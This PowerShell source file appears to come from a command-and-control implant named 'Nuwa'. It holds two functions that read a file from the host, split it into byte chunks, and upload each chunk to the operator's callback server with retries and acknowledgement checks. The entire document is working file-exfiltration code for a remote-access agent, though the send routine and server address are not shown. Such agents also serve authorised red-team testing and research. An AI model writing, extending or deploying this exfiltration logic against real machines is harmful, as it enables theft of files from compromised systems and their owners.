function Get-NuwaFileChunks {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [Parameter(Mandatory = $true)]
        [int]$ChunkSize
    )

    [byte[]]$fileBytes = Get-Content -LiteralPath $Path -Encoding Byte
    if ($fileBytes.Length -eq 0) {
        Write-Output -NoEnumerate @([byte[]]@())
        return
    }

    $chunks = @()
    for ($offset = 0; $offset -lt $fileBytes.Length; $offset += $ChunkSize) {
        $remaining = $fileBytes.Length - $offset
        $count = if ($remaining -lt $ChunkSize) { $remaining } else { $ChunkSize }
        if ($count -eq 1) {
            $chunkBytes = [byte[]]@($fileBytes[$offset])
        } else {
            $chunkBytes = [byte[]]$fileBytes[$offset..($offset + $count - 1)]
        }
        $chunks += ,$chunkBytes
    }

    Write-Output -NoEnumerate $chunks
}

function Invoke-NuwaDownload {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$TaskId,

        [Parameter(Mandatory = $true)]
        [hashtable]$Parameters
    )

    $sourcePath = Resolve-NuwaPath -Path ([string]$Parameters.path)
    $file = Get-Item -LiteralPath $sourcePath -Force
    if ($file.PSIsContainer) {
        throw (New-NuwaDiagnosticOutput -Code 1078)
    }

    $chunkSize = Get-NuwaFileChunkSize
    $requestAttempts = 3
    $chunks = Get-NuwaFileChunks -Path $sourcePath -ChunkSize $chunkSize
    if ($chunks -is [byte[]]) {
        $chunks = ,([byte[]]$chunks)
    } elseif ($null -eq $chunks) {
        $chunks = @()
    }
    $totalChunks = $chunks.Count
    if ($totalChunks -lt 1) {
        $totalChunks = 1
    }

    $initialDownload = @{}
    $initialDownload[$script:NuwaF_total_chunks] = $totalChunks
    $initialDownload[$script:NuwaF_full_path] = $sourcePath
    $initialDownload[$script:NuwaF_chunk_size] = $chunkSize
    if ($chunks.Count -eq 1) {
        $initialDownload[$script:NuwaF_chunk_num] = 1
        $initialDownload[$script:NuwaF_chunk_data] = ConvertTo-NuwaChunkData -Bytes $chunks[0]
    }

    $initialResponse = $null
    for ($attempt = 0; $attempt -lt $requestAttempts; $attempt += 1) {
        $entry = @{}
        $entry[$script:NuwaF_task_id] = $TaskId
        $entry[$script:NuwaF_download] = $initialDownload
        $body = @{}
        $body[$script:NuwaF_responses] = @($entry)
        $initialResponse = Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action $script:NuwaA_post_response -Body $body
        $initialResponseItems = if ($null -ne $initialResponse) { $initialResponse[$script:NuwaF_responses] } else { $null }
        if ($initialResponseItems -and @($initialResponseItems).Count -gt 0) {
            break
        }
        if (($attempt + 1) -lt $requestAttempts) {
            Start-Sleep -Seconds 1
        }
    }
    if ($null -eq $initialResponseItems -or @($initialResponseItems).Count -eq 0) {
        throw (New-NuwaDiagnosticOutput -Code 1029)
    }
    $fileId = [string](@($initialResponseItems)[0][$script:NuwaF_file_id])
    $chunkStartIndex = 0
    $chunkNumber = 1
    if ($chunks.Count -eq 1) {
        $chunkStartIndex = 1
        $chunkNumber = 2
    }

    for ($chunkIndex = $chunkStartIndex; $chunkIndex -lt $chunks.Count; $chunkIndex += 1) {
        $chunkBytes = $chunks[$chunkIndex]
        $chunkAcknowledged = $false
        for ($attempt = 0; $attempt -lt $requestAttempts; $attempt += 1) {
            $download = @{}
            $download[$script:NuwaF_chunk_num] = $chunkNumber
            $download[$script:NuwaF_file_id] = $fileId
            $download[$script:NuwaF_chunk_data] = ConvertTo-NuwaChunkData -Bytes $chunkBytes
            $entry = @{}
            $entry[$script:NuwaF_task_id] = $TaskId
            $entry[$script:NuwaF_download] = $download
            $body = @{}
            $body[$script:NuwaF_responses] = @($entry)
            $chunkResponse = Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action $script:NuwaA_post_response -Body $body
            $chunkResponseItems = if ($null -ne $chunkResponse) { $chunkResponse[$script:NuwaF_responses] } else { $null }
            if ($chunkResponseItems -and @($chunkResponseItems).Count -gt 0) {
                $chunkAcknowledged = $true
                break
            }
            if (($attempt + 1) -lt $requestAttempts) {
                Start-Sleep -Seconds 1
            }
        }
        if (-not $chunkAcknowledged) {
            throw (New-NuwaDiagnosticOutput -Code 1028 -Arguments @($chunkNumber))
        }
        $chunkNumber += 1
    }

    return ,(New-NuwaDiagnosticOutput -Code 1086 -Arguments @($fileId))
}
